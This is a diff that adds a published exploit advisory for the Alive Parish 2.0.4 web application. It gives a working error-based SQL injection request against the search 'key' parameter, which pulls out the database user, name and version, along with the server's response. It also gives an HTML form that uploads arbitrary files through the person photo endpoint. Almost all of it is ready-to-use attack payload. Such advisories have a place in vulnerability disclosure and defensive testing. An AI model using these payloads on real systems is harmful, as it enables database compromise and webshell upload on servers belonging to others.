@@ -1,0 +1,48 @@
+# Exploit Title: Alive Parish 2.0.4 - SQL Injection / Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-11-11
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://demo.aliveparish.com
+# Software Link: https://netcologne.dl.sourceforge.net/project/aliveparish/aliveparish-v2.0.zip
+# Version: 2.0.4
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/parish/search?key=[SQL]
+# 
+GET /[PATH]/parish/search?key=%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=d98c14a2b1f274925e7993331153a20d
+Connection: keep-alive
+HTTP/2.0 500 Internal Server Error
+Server: nginx
+Date: Sun, 11 Nov 2018 09:18:22 GMT
+Content-Type: text/html; charset=UTF-8
+x-powered-by: PHP/7.1.16
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-Firefox-Spdy: h2
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/person/photo/1
+# 
+# http://localhost/[PATH]/images/uploaded/[FILE]
+# 
+<html>
+<body>
+<form enctype="multipart/form-data" id="families-form" action="http://localhost/[PATH]/person/photo/1" method="post">
+<input id="ytPeople_raw_photo" value="" name="People[raw_photo]" type="hidden">
+<input name="People[raw_photo]" id="People_raw_photo" type="file">
+<input name="yt0" value="Save" type="submit">
+</form>
+</body>
+</html>
